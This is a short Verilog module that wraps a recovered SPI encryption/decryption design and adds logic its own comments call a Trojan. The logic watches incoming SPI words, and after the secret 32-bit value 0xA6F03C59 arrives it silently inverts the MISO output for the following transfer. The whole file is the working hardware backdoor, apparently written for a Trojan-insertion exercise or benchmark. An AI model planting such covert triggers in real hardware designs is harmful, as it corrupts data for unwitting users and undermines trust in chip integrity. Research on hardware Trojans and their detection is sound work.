module recovered (
    input  wire pin_36, // SCK
    input  wire pin_25, // ENC_DEC
    input  wire pin_28, // NORM_CS_N
    input  wire pin_32, // MOSI
    input  wire pin_34, // RST_N
    input  wire pin_27, // START
    output wire pin_38, // BUSY
    output wire pin_23, // ICE_LED
    output wire pin_31  // MISO
);

    wire orig_miso;

    // Instantiate original unmodified design
    recovered_original inst_recovered_original (
        .pin_36(pin_36),
        .pin_25(pin_25),
        .pin_28(pin_28),
        .pin_32(pin_32),
        .pin_34(pin_34),
        .pin_27(pin_27),
        .pin_38(pin_38),
        .pin_23(pin_23),
        .pin_31(orig_miso)
    );

    // Trojan Trigger and Payload State
    logic [31:0] shift_reg;
    logic [5:0]  bit_cnt;
    logic        trigger_armed;

    // Synchronous state machine tracking SPI transfers
    always_ff @(posedge pin_36) begin
        if (!pin_34) begin
            shift_reg     <= 32'b0;
            bit_cnt       <= 6'b0;
            trigger_armed <= 1'b0;
        end else begin
            if (!pin_28) begin
                // Shift in MOSI (MSB first)
                shift_reg <= {shift_reg[30:0], pin_32};
                
                // Track 32-bit transaction boundaries
                if (bit_cnt == 6'd31) begin
                    bit_cnt <= 6'b0;
                    
                    // Trigger match logic: evaluate entire 32-bit word upon completion
                    if ({shift_reg[30:0], pin_32} == 32'hA6F03C59) begin
                        trigger_armed <= 1'b1;
                    end else begin
                        // Clear the payload effect after one complete readout cycle
                        trigger_armed <= 1'b0; 
                    end
                end else begin
                    bit_cnt <= bit_cnt + 1'b1;
                end
            end else begin
                // Reset counter when CS goes high (idle)
                bit_cnt <= 6'b0;
            end
        end
    end

    // Corrupt (invert) MISO payload only when trigger is armed
    assign pin_31 = trigger_armed ? ~orig_miso : orig_miso;

endmodule
